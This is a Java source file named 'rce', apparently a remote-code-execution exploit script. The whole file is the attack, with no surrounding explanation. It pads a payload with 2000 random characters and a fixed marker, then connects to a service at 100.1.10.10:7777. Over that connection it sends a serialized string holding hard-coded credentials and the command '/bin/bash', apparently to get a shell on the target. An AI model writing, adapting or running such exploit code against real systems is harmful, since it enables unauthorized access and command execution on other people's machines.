
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.Random;

import javax.net.SocketFactory;

public class rce {

    public static String genString(){
        String alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
        StringBuilder sb = new StringBuilder();
        Random random = new Random();
        for(int i=0;i<2000;i++){
            int index = random.nextInt(alphabet.length());
            char c = alphabet.charAt(index);
            sb.append(c);
        }
        //Normal
        sb.append("z.a.q.rsimola");
        //Ascii
        //sb.append("%122.%97.%113.%114.simola");
        return sb.toString();
    }

    public static void main(String[] args){

        SocketFactory factory = SocketFactory.getDefault();
        try {
            System.out.println(rce.genString());
            Socket socket = factory.createSocket("100.1.10.10", 7777);
            ObjectOutputStream outputStream = new ObjectOutputStream(socket.getOutputStream());
            String command = "/bin/bash";
            outputStream.writeObject("bob!:.:!password!:.:!"+command+"!:.:!"+rce.genString());    
        } catch (Exception e) {
            //TODO: handle exception
        }
 
    }

}
